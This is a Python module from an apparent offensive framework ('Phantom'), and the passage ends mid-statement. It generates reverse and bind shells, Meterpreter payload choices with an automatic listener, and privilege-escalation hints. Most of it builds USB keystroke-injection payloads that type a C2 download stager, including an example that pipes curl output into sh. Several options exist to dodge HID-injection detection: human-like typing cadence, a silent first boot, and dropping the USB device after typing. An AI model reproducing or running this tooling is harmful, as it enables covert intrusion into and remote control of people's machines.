import os
import socket
from phantom.modules.base_module import BaseModule
from phantom.core.executor import run_command
from phantom.core.session import session
from phantom.utils.notifier import notifier
from rich.console import Console

console = Console()

PAYLOAD_TYPES = {
    "1": ("linux/x64/shell_reverse_tcp",         "Reverse shell TCP (Linux x64)"),
    "2": ("linux/x64/shell_bind_tcp",            "Bind shell TCP (Linux x64)"),
    "3": ("linux/x64/meterpreter/reverse_tcp",   "Meterpreter reverse TCP (Linux x64)"),
    "4": ("linux/x64/meterpreter/reverse_https", "Meterpreter reverse HTTPS (Linux x64)"),
    "5": ("linux/x86/shell_reverse_tcp",         "Reverse shell TCP (Linux x86)"),
    "6": ("windows/x64/shell_reverse_tcp",       "Reverse shell TCP (Windows x64)"),
    "7": ("windows/x64/meterpreter/reverse_tcp", "Meterpreter reverse TCP (Windows x64)"),
    "8": ("windows/x86/shell_reverse_tcp",       "Reverse shell TCP (Windows x86)"),
}

FORMATS = {
    "1": ("elf",  "ELF (Linux binary)"),
    "2": ("py",   "Python"),
    "3": ("sh",   "Bash one-liner"),
    "4": ("php",  "PHP"),
    "5": ("ps1",  "PowerShell"),
    "6": ("exe",  "Windows EXE"),
    "7": ("asp",  "ASP"),
    "8": ("war",  "WAR (Tomcat)"),
}


def _detect_os_from_xml(target: str) -> str:
    """
    Read OS detection results from the Nmap XML saved during scan.
    Returns a human-readable OS string, or empty string if not found.
    """
    from phantom.utils.paths import scan_xml_path
    xml_path = scan_xml_path(target)
    if not os.path.exists(xml_path):
        return ""

    try:
        import xml.etree.ElementTree as ET
        tree = ET.parse(xml_path)
        root = tree.getroot()

        for host in root.findall("host"):
            os_elem = host.find("os")
            if os_elem is None:
                continue

            # osmatch contains the best guess with accuracy percentage
            best_match = None
            best_accuracy = 0

            for osmatch in os_elem.findall("osmatch"):
                accuracy = int(osmatch.get("accuracy", "0"))
                if accuracy > best_accuracy:
                    best_accuracy = accuracy
                    best_match = osmatch.get("name", "")

            if best_match and best_accuracy >= 85:
                return best_match

    except Exception:
        pass

    return ""


def _os_to_payload_hint(os_string: str) -> tuple:
    """
    Given an OS string, return the (arch, platform) payload hint.

    The classification belongs to `phantom.utils.target_platform` (ONE
    source shared with the agent, the C2 shell and the network map): this
    function only keeps the module's historical (arch, platform) shape.
    """
    from phantom.utils.target_platform import from_os_string
    answer = from_os_string(os_string, source="os string")
    if not answer.platform:
        # no family in the string: keep the module's historical linux
        # default, but the ARCH it stated is still real information
        # ("Unknown i386 OS" is 32-bit even though it names no family)
        return answer.arch, "linux"      # caller warns: see `_guess_os`
    return answer.arch, answer.platform


def _confirm_typing() -> bool:
    """Ask before writing a payload whose command looks like the wrong OS.

    Non-interactive callers (a script, an automated run, a test) get the
    answer they cannot be asked for: proceed, with the warning already
    printed. Refusing there would be a silent block, which the command
    promises NOT to do --- `--strict` is the explicit refusal.
    """
    import sys
    if not sys.stdin.isatty():
        return True
    try:
        answer = input("  Write the artefact anyway? [y/N]: ")
    except (EOFError, KeyboardInterrupt):
        return False
    return answer.strip().lower() in ("y", "yes")


class PayloadModule(BaseModule):
    module_name = "payload"

    def build_commands(self) -> dict:
        return self._with_suggestions(
            {
                "CORE": ["generate", "reverse [lhost] [lport]",
                          "bind [port]", "deploy", "privesc"],
                "DELIVERY": ["hid <board> [\"<command>\" | --from-payload <id> | "
                             "--stager <os>] [--stager-mode <m>] "
                             "[--stager-attempts <n>] [--type-into <os>] "
                             "[--out <file>]"],
                "LISTENER": ["handler <port> <payload>"],
            },
            self.suggest_commands(),
        )

    def suggest_commands(self) -> dict:
        """Platform-aware payload generation for the detected target OS."""
        from phantom.modules.suggest import payload_suggestion_group
        return payload_suggestion_group()

    def do_reverse(self, arg):
        """reverse [lhost] [lport] — synthesize a multi-dialect reverse
        shell with the enterprise payload engine (the same one the
        auto-mode ships): best dialect for the target platform, optional
        base64 encoder, automatic listener, and the beacon upgrade path."""
        from phantom.automation.brain.payload import get_payload_engine
        os_string, arch, platform = self._guess_os()
        parts = (arg or "").split()
        lhost = parts[0] if parts else self._get_lhost()
        try:
            lport = int(parts[1]) if len(parts) > 1 else \
                    int(session.lport or 4444)
        except (TypeError, ValueError):
            lport = 4444
        engine = get_payload_engine()
        options = engine.reverse_options(platform)
        console.print(f"\n[bold]-- REVERSE SHELL ({platform} · {os_string}) --[/]\n")
        console.print(f"  LHOST: [yellow]{lhost}[/]   LPORT: [yellow]{lport}[/]\n")
        console.print("  Dialects (best-first for this platform):")
        for i, d in enumerate(options, 1):
            marker = " [dim](best)[/]" if i == 1 else ""
            console.print(f"    [{i}] {d}{marker}")
        pick = input(f"  Dialect [1-{len(options)}] [1]: ").strip() or "1"
        try:
            dialect = options[int(pick) - 1]
        except (ValueError, IndexError):
            notifier.error("Invalid dialect.")
            return
        enc = input("  Encoder [plain|base64] [plain]: ").strip() or "plain"
        if enc not in engine.ENCODERS:
            notifier.error("Invalid encoder.")
            return
        payload = engine.reverse(platform, lhost, lport,
                                 dialect=dialect, encoder=enc)
        console.print(f"\n  [bold green][+] {payload.note}[/]")
        console.print(f"      [yellow]{payload.command}[/]\n")
        # optional automatic listener
        act = input("  Start listener now? [y/N]: ").strip().lower()
        if act.startswith("y"):
            from phantom.modules.handler import HandlerModule
            HandlerModule().do_nc(str(lport))
        console.print("  [dim]Next:\t'use payload' → deploy  (or 'use exploit' →"
                      " deploy-agent) upgrades this foothold to the C2\n"
                      "  beacon — full post-exploitation over the encrypted"
                      " channel.[/]")
        session.add_note(f"Reverse shell ({dialect}/{enc}) {lhost}:{lport}")

    def do_bind(self, arg):
        """bind [port] — synthesize a BIND shell (target listens).
        LOUD BY NATURE: only use when outbound egress is blocked."""
        from phantom.automation.brain.payload import get_payload_engine
        os_string, arch, platform = self._guess_os()
        try:
            port = int((arg or "").split()[0]) if (arg or "").split() else 4444
        except ValueError:
            notifier.error("Usage: bind <port>")
            return
        engine = get_payload_engine()
        options = engine.bind_options(platform)
        console.print(f"\n[bold]-- BIND SHELL ({platform}) --[/]")
        console.print(f"  Target listens on port [yellow]{port}[/].\n")
        console.print("  Dialects:")
        for i, d in enumerate(options, 1):
            marker = " [dim](best)[/]" if i == 1 else ""
            console.print(f"    [{i}] {d}{marker}")
        pick = input(f"  Dialect [1-{len(options)}] [1]: ").strip() or "1"
        try:
            dialect = options[int(pick) - 1]
        except (ValueError, IndexError):
            notifier.error("Invalid dialect.")
            return
        payload = engine.bind(platform, port, dialect=dialect)
        console.print(f"\n  [bold green][+] {payload.note}[/]")
        console.print(f"      [yellow]{payload.command}[/]\n")
        notifier.warn("Bind shells are LOUD — prefer reverse unless egress "
                      "is blocked.")
        session.add_note(f"Bind shell ({dialect}) port {port}")

    def do_privesc(self, _):
        """privesc — run ACTIVE privilege-escalation enumeration on the
        target (sudo -l, SUID, writable files) using harvested creds, and
        list the matching GTFOBins/tools. Falls back to the tool list when
        no access is available yet."""
        # If we have access (creds on the target), delegate to the real
        # enumeration so this is actionable, not just a static list.
        try:
            from phantom.core.knowledge import session_wm
            if session_wm().find("creds", valid=True):
                from phantom.modules.exploit import ExploitModule
                notifier.status("Access available — running active privesc "
                                "enumeration over SSH...")
                ExploitModule().do_privesc_run("")
                console.print(
                    "\n[dim]Suggested tools for the findings above:[/]")
                console.print("  - [green]LinPEAS[/] / [green]linux-exploit-suggester[/]")
                console.print("  - [green]GTFOBins[/]: https://gtfobins.github.io")
                return
        except Exception:
            pass
        # No access yet: senior guidance + the enumeration plan to reach it.
        os_string, arch, platform = self._guess_os()
        
        console.print(f"\n[bold yellow]--- Privilege Escalation Assistant ({platform.capitalize()} {arch}) ---[/]")
        
        if platform == "windows":
            console.print("[bold]Suggested Tools:[/]")
            console.print("  - [green]WinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS")
            console.print("  - [green]PrivescCheck[/]: https://github.com/itm4n/PrivescCheck")
            console.print("  - [green]Seatbelt[/]: https://github.com/GhostPack/Seatbelt")
            console.print("\n[bold]Suggested Techniques:[/]")
            console.print("  - Check for Unquoted Service Paths")
            console.print("  - Check for AlwaysInstallElevated registry key")
            console.print("  - Check for Token Impersonation (SeImpersonatePrivilege)")
        else:
            console.print("[bold]Suggested Tools:[/]")
            console.print("  - [green]LinPEAS[/]: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS")
            console.print("  - [green]Linux Smart Enumeration (lse.sh)[/]: https://github.com/diego-treitos/linux-smart-enumeration")
            console.print("  - [green]linux-exploit-suggester[/]: https://github.com/The-Z-Old-GitHub-Repo-of-Linux-Exploit-Suggester/linux-exploit-suggester")
            console.print("\n[bold]Suggested Techniques:[/]")
            console.print("  - Check for SUID binaries (`find / -perm -u=s -type f 2>/dev/null`) ")
            console.print("  - Check for writable /etc/passwd or /etc/shadow")
            console.print("  - Check sudo permissions (`sudo -l`)")

    def do_hid(self, arg):
        """hid <board> ["<command>" | --from-payload <id> | --stager <os>] [flags]

        Build a USB HID payload for a keyboard-injector board: AutoRun on
        removable volumes is dead at the OS level, so the vector that works
        is a board that TYPES the payload (RP2040/Pico with CircuitPython,
        Flipper Zero BadUSB, O.MG cable, Arduino-IDE `Keyboard.h` boards).

        TWO THINGS ARE CALLED "target" IN PHANTOM AND ONLY ONE IS A FLAG
        HERE: `--type-into <os>` is the OS the board will TYPE INTO (it picks
        the opener and it is the OS the typed command must match), while the
        engagement target is `targets add <host>` / `set target <ip>` — the
        board has no idea which host the command lands on. `--target` still
        works as a DEPRECATED alias of `--type-into`, and warns.

        Command source — exactly one:
          "<command>"       the literal command the board types.
          --from-payload <id>
                            use the command `generate` already built and
                            registered (see `payloads`). The id may be a
                            unique prefix; an unknown or ambiguous id is
                            refused and the inventory is listed, and the
                            payload's platform must match --type-into. By
                            DEFAULT the short download stager for that
                            payload's own endpoint is typed (see
                            --stager-mode); --stager-mode inline types the
                            registered command itself.
          --stager <os>     build the PHANTOM stager for that OS with the
                            current C2 endpoint and type THAT.

        Flags:
          --type-into <os>  the OS the board will type into (windows|linux|
                          macos|android): the command must match it, and
                          nothing can detect it at runtime (9.2)
          --target <os>   deprecated alias of --type-into (it is NOT the
                          engagement target: that one is `targets add`)
          --layout <l>    the keyboard layout the TARGET has active
                          (us|it, default `auto` = this machine's locale).
                          The board sends US scan codes, so on an Italian
                          target `:` `:` `?` `{}` `@` `#` come out wrong
                          unless the command is pre-translated for that
                          layout: a US `:` is Shift+`;`, which an Italian
                          keyboard reads as `ç`. Nothing on the board can
                          read the target's layout, so this is stated in the
                          artefact rather than guessed silently.
          --stager <os>   build the PHANTOM stager for that OS with the
                          current C2 endpoint and type THAT (instead of
                          pasting a command by hand). The stager is
                          RESILIENT: if the C2 is down when the board is
                          plugged in, it schedules its own retry (Windows
                          scheduled task / POSIX cron) so the beacon still
                          lands once the C2 comes up — the operator types
                          it once and walks away.
          --stager-mode <m>
                          HOW --stager is delivered. `download` (default)
                          types a ~300-char fetcher and the C2 serves the
                          beacon; `inline` types the full one-liner (~11.4k
                          chars on Windows). HID is the one channel where
                          the LENGTH is the cost — the board types every
                          character on screen — so download is the default
                          HERE. The paste-a-command channels (`generate`,
                          `exploit`) keep their inline dropper: nothing is
                          typed there, so an inline one-liner costs them
                          nothing and they are not affected by this.
                          Both modes fetch the SAME artefact from the same
                          C2 route, so switching does not change what lands
                          on the target.
                          It applies to --from-payload too, and there it is
                          the default as well: download reads the endpoint
                          the registered payload was BUILT for and types a
                          short fetcher, so an 11.4k registered command does
                          not get typed either. A registered command with no
                          readable endpoint cannot be fetched from: it is
                          then typed AS REGISTERED, with a warning, because
                          a default must not dead-end. Asking explicitly
                          (--stager-mode download, or --stager-attempts) is
                          an ERROR in that case instead of a fallback.
          --stager-attempts <n>
                          how many times the download stager's retry loop
                          may try before it gives up and EXITS (default:
                          `c2.stager_attempts` / PHANTOM_STAGER_ATTEMPTS,
                          else 20). A loop with no budget is an invisible
                          process polling a dead endpoint for ever, so this
                          is bounded on purpose.
          --strict        refuse (instead of asking) when the command does
                          not match --type-into
          --out <file>    where to write the artefact (default:
                          data/vectors/)
          --delay <ms>    wait before typing (default 1500: the host has to
                          enumerate the HID device first)
          --countdown <s>
                          seconds on a BLINKING LED between power-up and the
                          first keystroke (default 3). This was 15 while the
                          board was expected to be flashed in place and
                          unplugged mid-typing; with the one-shot default and
                          the silent first boot nothing needs rescuing any
                          more, and 15 s standing in front of the target is
                          exposure for no reason. `0` skips it. Give a value
                          here if your board has no LED on LED_BUILTIN (most
                          Pro Micro clones do not): then the countdown is
                          time you cannot see.
          --no-first-boot-safe
                          turn OFF the first-boot guard. By default the first
                          boot after a flash is SILENT: a per-build tag in
                          EEPROM (Arduino/AVR) or nvm (Pico) does not match,
                          so the sketch cannot type on the machine that just
                          flashed it and fires on the NEXT power-up. Disable
                          only if you need the board to fire the moment the
                          upload finishes.
          --cadence <ms>  average milliseconds PER TYPED CHARACTER (default
                          10, ~100 chars/s) with a jittered pause between
                          bursts. A board at full speed types a 260-char
                          stager in a fraction of a second, which is the
                          second thing a HID-injection detector sees after
                          the device itself; this costs ~2.5 s of visible
                          typing instead. `0` types the command in one burst.
                          keystrokes long before the cadence stops looking
                          human. Not applicable to DuckyScript boards
                          (flipper, omg): STRING runs at the device's fixed
                          rate, and the artefact says so.
          --nonce <hex>   stamp the artefact with a per-flash nonce (default:
                          generated automatically when --flash is used). The
                          first-boot tag is content-derived, so without this a
                          re-flash of the same artefact looks like the same
                          build and does NOT clear the one-shot marker: the
                          board stays mute for ever. Pass it explicitly to
                          reproduce a specific flash.
          --shots <n>     Arduino only: how many DELIVERIES one flash is
                          worth (default 3). The sketch keeps a counter in
                          EEPROM and decrements it before each delivery;
                          when it reaches 0 the board stays silent on every
                          later power-up, so carrying it back to the machine
                          that flashed it does not re-inject there.
                          Re-flashing resets it. `--shots 0` = unlimited.
          --repeat        same as `--shots 0`: fire on EVERY power-up.
                          Kept as the explicit opt-out; a board with no
                          counter types on the machine that flashed it too.
          --no-enter      do not press Enter after the command
          --arm           Arduino only: require TWO presses of a button on
                          --arm-pin before the board types. Off by default:
                          without it the board types the moment it is powered,
                          so unplug it before flashing (or it fires on THIS
                          machine). Use it if you reflash often in place.
          --arm-pin <n>   pin the arm button is on (default 7)
          --eject         after typing, drop the USB connection so the host
                          stops seeing a keyboard: the board stays powered
                          and needs a power cycle to come back. This is the
                          alternative to --countdown when the board is
                          flashed in place — it disappears instead of
                          waiting to be unplugged. DuckyScript boards
                          (flipper, omg) cannot do it, and the artefact says
                          so instead of pretending.
          --run           open a console first (one chord per target:
                          Win+R on Windows, Ctrl+Alt+T on Linux,
                          Cmd+Space on macOS)
          --flash <port>  Arduino board only: build and upload the sketch
                          with arduino-cli (compile then upload), e.g.
                          --flash COM5. The sketch folder is created with
                          the name the Arduino toolchain requires.
                          `--flash auto` (or `detect`) reads the port AND
                          the board id from `arduino-cli board list`: one
                          board on the bench is used, zero or several are
                          refused with what was seen instead of guessed.
          --fqbn <fqbn>   board id for --flash. Default: the board the
                          flasher detected, else arduino:avr:micro
                          (leonardo is arduino:avr:leonardo). An explicit
                          id still wins over detection.
          --arduino-cli <path>  arduino-cli binary for --flash (default:
                          PATH, else $PHANTOM_ARDUINO_CLI)

        Examples:
          payload hid pico --stager windows --type-into windows --run
          payload hid flipper "curl -sk http://10.0.0.5:8443/x | sh" \\
              --type-into linux
          payload hid omg --stager linux --type-into linux
          payload hid arduino --from-payload 3f2a91c4 --type-into windows
          payload hid arduino --stager windows --type-into windows --run \\
              --layout it
          payload hid flipper --stager linux --type-into linux \\
              --stager-mode inline
          payload hid leonardo --from-payload 3f2a91c4 --type-into windows \\
              --flash COM5 --fqbn arduino:avr:leonardo
          payload hid leonardo --stager windows --type-into windows \\
              --flash auto --eject --countdown 0
        """
        from phantom.utils.hid_builder import (
            ALL_BOARD_NAMES, ARDUINO_BOARDS, DEFAULT_CHAR_DELAY_MS, board_notes,
            build_hid_payload, canonical_board, mismatch_hints)
        from phantom.utils.hid_layouts import detected_layout

        parts = arg.strip().split()
        board = ""
        board_arg = ""
        command = ""
        target = ""
        from_payload = ""
        stager = ""
        stager_mode = ""
        stager_mode_given = False
        stager_attempts = 0
        layout = ""
        out = ""
        delay_ms = 1500
        char_delay_ms = DEFAULT_CHAR_DELAY_MS
        from phantom.utils.hid_builder import DEFAULT_COUNTDOWN_S
        countdown_s = DEFAULT_COUNTDOWN_S
        first_boot_safe = True
        from phantom.utils.hid_builder import DEFAULT_SHOTS
        shots = DEFAULT_SHOTS
        press_enter = True
        # None = "decide from the target": see the block after the token loop.
        open_run = None
        arm = False
        arm_pin = 7
        arm_pin_given = False
        build_nonce = ""
        eject = False
        flash = ""
        fqbn = ""
        arduino_cli = ""
        strict = False
        deprecated_target = False

        i = 0
        while i < len(parts):
            tok = parts[i]
            if tok in ("--type-into", "--target") and i + 1 < len(parts):
                value = parts[i + 1].lower()
                if tok == "--target":
                    deprecated_target = True
                if target and target != value:
                    notifier.error(
                        f"--type-into {target} and --target {value} disagree: "
                        f"the board types into ONE os.")
                    return
                target = value
                i += 2
                continue
            if tok == "--from-payload" and i + 1 < len(parts):
                from_payload = parts[i + 1]
                i += 2
                continue
            if tok == "--stager" and i + 1 < len(parts):
                stager = parts[i + 1].lower()
                i += 2
                continue
            if tok == "--stager-mode":
                if i + 1 >= len(parts):
                    notifier.error("--stager-mode wants download or inline")
                    return
                stager_mode = parts[i + 1].lower()
                stager_mode_given = True
                if stager_mode not in ("download", "inline"):
                    notifier.error(
                        f"unknown --stager-mode '{stager_mode}': download "
                        f"lets the C2 serve the beacon (short — the HID "
                        f"default), inline types the whole one-liner")
                    return
                i += 2
                continue
            if tok == "--stager-attempts":
                if i + 1 >= len(parts):
                    notifier.error("--stager-attempts wants a count")
                    return
                try:
                    stager_attempts = int(parts[i + 1])
                except ValueError:
                    notifier.error("--stager-attempts wants a count")
                    return
                if stager_attempts < 1:
                    notifier.error("--stager-attempts must be at least 1: a "
                                   "stager with no attempt left is a no-op.")
                    return
                i += 2
                continue
            if tok == "--layout" and i + 1 < len(parts):
                layout = parts[i + 1].lower()
                i += 2
                continue
            if tok == "--out" and i + 1 < len(parts):
                out = parts[i + 1]
                i += 2
                continue
            if tok == "--flash" and i + 1 < len(parts):
                flash = parts[i + 1]
                i += 2
                continue
            if tok == "--fqbn" and i + 1 < len(parts):
                fqbn = parts[i + 1]
                i += 2
                continue
            if tok == "--arduino-cli" and i + 1 < len(parts):
                arduino_cli = parts[i + 1]
                i += 2
                continue
            if tok == "--delay" and i + 1 < len(parts):
                try:
                    delay_ms = int(parts[i + 1])
                except ValueError:
                    notifier.error("--delay wants milliseconds")
                    return
                i += 2
                continue
            if tok == "--countdown" and i + 1 < len(parts):
                try:
                    countdown_s = int(parts[i + 1])
                except ValueError:
                    notifier.error("--countdown wants seconds (0 skips it)")
                    return
                if countdown_s < 0:
                    notifier.error("--countdown cannot be negative: 0 skips it")
                    return
                i += 2
                continue
            if tok == "--no-first-boot-safe":
                first_boot_safe = False
                i += 1
                continue
            if tok == "--nonce" and i + 1 < len(parts):
                build_nonce = parts[i + 1].strip()
                i += 2
                continue
            if tok == "--shots":
                if i + 1 >= len(parts):
                    notifier.error("--shots wants a count (0 = unlimited)")
                    return
                try:
                    shots = int(parts[i + 1])
                except ValueError:
                    notifier.error("--shots wants a count (0 = unlimited)")
                    return
                if shots < 0:
                    notifier.error("--shots cannot be negative: 0 means "
                                   "unlimited")
                    return
                if shots > 255:
                    notifier.error("--shots must fit in one EEPROM byte "
                                   "(0-255)")
                    return
                i += 2
                continue
            if tok == "--once":
                shots = 1
                i += 1
                continue
            if tok == "--repeat":
                shots = 0
                i += 1
                continue
            if tok == "--cadence" and i + 1 < len(parts):
                try:
                    char_delay_ms = int(parts[i + 1])
                except ValueError:
                    notifier.error("--cadence wants milliseconds per "
                                   "character (0 types the command in one "
                                   "burst)")
                    return
                if char_delay_ms < 0:
                    notifier.error("--cadence cannot be negative: 0 types "
                                   "the command in one burst")
                    return
                i += 2
                continue
            if tok == "--no-enter":
                press_enter = False
                i += 1
                continue
            if tok == "--run":
                open_run = True
                i += 1
                continue
            if tok in ("--no-run", "--no-open"):
                open_run = False
                i += 1
                continue
            if tok == "--arm":
                arm = True
                i += 1
                continue
            if tok == "--arm-pin" and i + 1 < len(parts):
                try:
                    arm_pin = int(parts[i + 1])
                except ValueError:
                    notifier.error("--arm-pin wants a pin number")
                    return
                arm_pin_given = True
                i += 2
                continue
            if tok == "--eject":
                eject = True
                i += 1
                continue
            if tok == "--strict":
                strict = True
                i += 1
                continue
            if not board and tok.lower() in ALL_BOARD_NAMES:
                # the board the operator PLUGGED IN (leonardo, pro-micro) and
                # the FAMILY that decides the generator are two things: the
                # variant is kept for the artefact name and the FQBN.
                board_arg = tok.lower()
                board = canonical_board(board_arg)
                i += 1
                continue
            # anything left is the command to type (quotes already stripped
            # by the shell / the module's argument splitter)
            command = (command + " " + tok).strip()
            i += 1

        # A WINDOWS PAYLOAD WITH NO OPENER TYPES INTO THE VOID. Measured
        # 2026-11-02 on the lab HP: the board typed from the SECOND word (the
        # first ones were eaten while focus settled), nothing executed, and
        # the operator had to read a command that started mid-word to find
        # out why. "I forgot --run" must not be a silent wrong flash, so for a
        # Windows target the opener is the DEFAULT and `--no-run` is the
        # explicit opt-out. Linux/macOS openers stay opt-in: their console
        # shortcut depends on the desktop and guessing is the same failure.
        if open_run is None:
            open_run = (target or "").strip().lower() == "windows"

        # `--flash auto` means "find the board yourself": arduino-cli board
        # list reports the port and the FQBN together, so the operator should
        # not have to know whether the bench says COM5 or COM7 today. `-` and
        # `detect` are accepted for the same thing because typing a literal
        # dash is what people reach for.
        flash_port = ("" if (flash or "").strip().lower()
                      in ("auto", "detect", "-") else flash)

        if not board:
            notifier.error(
                f"hid wants a board: {', '.join(ALL_BOARD_NAMES)}")
            return
        if deprecated_target:
            # One word, two meanings in the same CLI: `target` everywhere
            # else in Phantom is the engagement HOST. Saying which one this
            # is, once, is the whole fix — and --target keeps working.
            notifier.warn(
                "--target here is only the OS the board TYPES INTO; the "
                "engagement target is `targets add` / `set target`. Use "
                "--type-into <os> (--target stays as a deprecated alias).")
        if flash and board not in ARDUINO_BOARDS:
            notifier.error("--flash uploads through arduino-cli, which only "
                           "serves the 'arduino' board")
            return
        # THE LAYOUT IS A PROPERTY OF THE TARGET AND IT HAS NO HONEST DEFAULT.
        # A board sends US scan codes and the target translates them, so a US
        # `:` (Shift+`;`) arrives as `ç` on an Italian keyboard: the URL typed
        # on screen became `192.168.1.155ç9443` while the sketch looked right.
        # Nothing on the board can read the target back, so the operator's own
        # locale is the best available signal — stated out loud, overridable
        # with --layout, and never silent.
        if layout in ("", "auto"):
            layout = detected_layout()
            notifier.info(
                f"keyboard layout {layout}: from this machine's locale, since "
                f"the target's cannot be read from a keyboard — override with "
                f"--layout us|it if the bench and the target differ")
        elif layout == "us" and detected_layout() != "us":
            notifier.warn(
                "--layout us on a machine that is not US: right only if the "
                "target is US as well — otherwise every shifted symbol lands "
                "as a different character (`:` types `ç` on an Italian layout)")
        # ARMED OR NOT IS A SAFETY PROPERTY, so a flag that cannot take
        # effect is an error, not a silence: an operator who asked for an
        # armed board and got one that fires on power-up has been misled
        # about the only thing that matters here.
        if arm and board not in ARDUINO_BOARDS:
            notifier.error(
                f"--arm needs a board with a firmware loop to hang a button "
                f"on: '{board_arg or board}' types its script the moment it "
                f"is powered and cannot be armed. Use an Arduino board "
                f"({', '.join(sorted(ARDUINO_BOARDS))}) or drop --arm.")
            return
        if arm_pin_given and not arm:
            notifier.error(
                "--arm-pin has no effect without --arm: the board has to be "
                "armed before a pin can matter. Add --arm, or drop "
                "--arm-pin.")
            return
        if from_payload and stager:
            notifier.error("--from-payload uses the command that already "
                           "exists and --stager builds a new one: pick one.")
            return
        if stager_mode and not stager and not from_payload:
            notifier.error("--stager-mode decides how the stager is "
                           "delivered: pass --stager <os> with it, or use "
                           "it with --from-payload.")
            return
        if not stager_mode_given:
            # HID DEFAULT for BOTH sources: the board types a FETCHER and the
            # C2 serves the beacon. The channels that paste a command
            # (generate, exploit, c2) never reach this flag — nothing is typed
            # for them, so an inline one-liner costs them nothing and their
            # default is unchanged. `--from-payload` matters most here:
            # reusing a registered payload (generate once, type many) is how
            # HID is actually used, and typing its 11.4k command was the
            # exact cost this mode exists to remove.
            stager_mode = "download"
        if stager_attempts and stager_mode == "inline":
            notifier.error("--stager-attempts configures the DOWNLOAD "
                           "stager's retry loop, and inline has no loop.")
            return
        if stager_attempts and not (stager or from_payload):
            notifier.error("--stager-attempts configures the DOWNLOAD "
                           "stager's retry loop: pass --stager <os> or "
                           "--from-payload.")
            return
        if from_payload and command:
            notifier.error(
                "--from-payload plus an inline command is two sources for one "
                "artefact: drop one (a silent precedence is how the wrong "
                "command gets typed).")
            return
        payload_platform = ""
        if from_payload:
            from phantom.utils.payload_manager import get_custom_beacons
            history = get_custom_beacons()
            if not history:
                notifier.error("no generated payload in the inventory: run "
                               "`generate <os>` first (or type the command "
                               "inline).")
                return
            matches = [e for e in history
                       if str(e.get("id", "")).startswith(from_payload)]
            if not matches:
                notifier.error(f"no payload with id '{from_payload}'.")
                notifier.info("available payloads (full command with "
                              "`payloads <id>`):")
                for entry in history:
                    notifier.info(f"  {str(entry.get('id', ''))[:8]}..  "
                                  f"{str(entry.get('platform', '?')):8} "
                                  f"{entry.get('description', '')}")
                return
            if len(matches) > 1:
                notifier.error(f"ambiguous id '{from_payload}' — "
                               f"{len(matches)} payloads start with it:")
                for entry in matches:
                    notifier.info(f"  {entry.get('id')}  "
                                  f"{entry.get('platform', '?')}  "
                                  f"{entry.get('description', '')}")
                return
            entry = matches[0]
            payload_platform = str(entry.get("platform") or "").lower()
            command = str(entry.get("command") or "").strip()
            if not command:
                notifier.error(f"payload {from_payload} carries no command to "
                               "type (regenerate it with `generate`).")
                return
            notifier.info(f"payload {str(entry.get('id', ''))[:8]}.. "
                          f"({payload_platform or 'unknown'}): "
                          f"{entry.get('description', '')}")

        def _download_stager(platform: str, host: str, port: int,
                             use_ssl: bool, attempts: int) -> str:
            """The short HID fetcher, or "" with the refusal already reported."""
            from phantom.utils import short_stager as ss
            from phantom.utils.c2_crypto import get_payload_token
            try:
                return ss.hid_download_command(
                    platform, host, port, token=get_payload_token(),
                    ssl=use_ssl, attempts=attempts or None)
            except ValueError as exc:
                notifier.error(str(exc))
                return ""

        if from_payload and stager_mode == "download":
            # `--from-payload` ALONE means "type the registered command" and
            # that is unchanged — the registered Windows command is ~11.4k
            # chars, though, and reusing a payload is how HID is actually
            # used (generate once, type many), so download mode is offered
            # here too. It reads the endpoint the registered payload was
            # BUILT for and types a short fetcher for it, so a payload
            # generated against another listener is never silently
            # re-pointed at this session's config.
            from phantom.utils import short_stager as ss
            endpoint = ss.endpoint_from_registered_command(command)
            # A registered command can be unfetchable for two different
            # reasons and both are named rather than merged into one shrug.
            if not endpoint:
                why = "carries no C2 endpoint I can read"
            elif payload_platform == "android":
                why = "is an Android payload, which is an HTTP channel, not HID"
            elif not ss.download_route(payload_platform):
                why = (f"is registered as {payload_platform!r}, a platform with "
                       f"no download route")
            else:
                why = ""
            if why:
                # Two very different reasons to be here: the operator ASKED for
                # a fetcher (a command that cannot back one is an error), or
                # download is merely the DEFAULT and this entry was hand-made
                # or hosted elsewhere (then typing it as registered, loudly,
                # is still delivery). A default that can dead-end is worse
                # than a long command.
                if stager_mode_given or stager_attempts:
                    notifier.error(
                        f"payload {from_payload} {why}, so a download stager "
                        f"cannot be built for it. Use --stager-mode inline to "
                        f"type it as registered.")
                    return
                notifier.warn(
                    f"payload {from_payload} {why}, so there is nothing to "
                    f"fetch: its command is typed AS REGISTERED "
                    f"({len(command)} chars). Regenerate it with `generate` "
                    f"for a short download stager, or pass --stager-mode "
                    f"inline to say so explicitly.")
            else:
                host, port, use_ssl = endpoint
                command = _download_stager(payload_platform, host, port,
                                           use_ssl, stager_attempts)
                if not command:
                    return
                notifier.info(
                    f"download stager for the registered "
                    f"{payload_platform or 'unknown'} payload: {len(command)} "
                    f"chars typed, fetching from the endpoint it was built for "
                    f"({'https' if use_ssl else 'http'}://{host}:{port})")
        if stager:
            if target and target != stager:
                notifier.error(
                    f"--stager {stager} but the board types into {target}: "
                    f"one artefact, and PE ≠ ELF ≠ Mach-O — pick one.")
                return
            from phantom.utils.network import c2_endpoint_status
            # ONE source of truth for the endpoint this artefact will call
            # back to, and whether anything is listening there. TLS is
            # CONFIGURATION, not a constant, and the PORT is compared too: a
            # board pointed at a port the listener is not on types its whole
            # command, reports success and never gets a beacon — the failure
            # this command was least able to show anyone.
            ep = c2_endpoint_status(host=session.lhost or self._get_lhost())
            host, port, use_ssl = ep.host, ep.port, ep.use_ssl
            scheme = "https" if use_ssl else "http"
            for problem in ep.warnings():
                notifier.warn(problem)
            if stager_mode == "download":
                # The board types every character ON SCREEN, which is the
                # whole reason this branch exists: the inline Windows stager
                # is ~11.4k chars — minutes of typing, with the Run dialog's
                # own length limit in the way. A download stager types a
                # ~300-char fetcher and the C2 serves the beacon from the
                # SAME route the inline dropper fetches from, so the artefact
                # is byte-identical either way.
                command = _download_stager(stager, host, port, use_ssl,
                                           stager_attempts)
                if not command:
                    return
                notifier.info(f"download stager for {stager}: {len(command)} "
                              f"chars typed, the C2 at {scheme}://{host}:"
                              f"{port} serves the beacon")
            else:
                from phantom.utils.builder import generate_dropper
                command = generate_dropper(stager, host, port,
                                           use_ssl=use_ssl, resilient=True)
                notifier.info(f"inline stager for {stager} built with the "
                              f"current C2 endpoint ({scheme}://{host}:{port}): "
                              f"{len(command)} chars will be typed")
            target = target or stager
            payload_platform = payload_platform or stager
        if not command:
            notifier.error("hid wants the command to type (or --from-payload "
